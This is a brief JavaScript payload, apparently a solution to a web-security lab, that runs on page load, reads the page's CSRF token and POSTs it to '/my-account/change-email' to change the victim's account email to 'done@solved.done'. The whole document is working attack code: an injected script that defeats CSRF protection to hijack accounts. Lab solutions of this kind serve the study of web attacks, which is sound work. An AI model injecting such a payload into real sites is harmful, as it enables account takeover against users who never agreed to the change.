window.addEventListener('DOMContentLoaded',()=>{
var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();

data.append('email','done@solved.done');
data.append('csrf',token);

fetch('/my-account/change-email',{
    method: "POST",
    mode: "no-cors",
    body:data
});
});
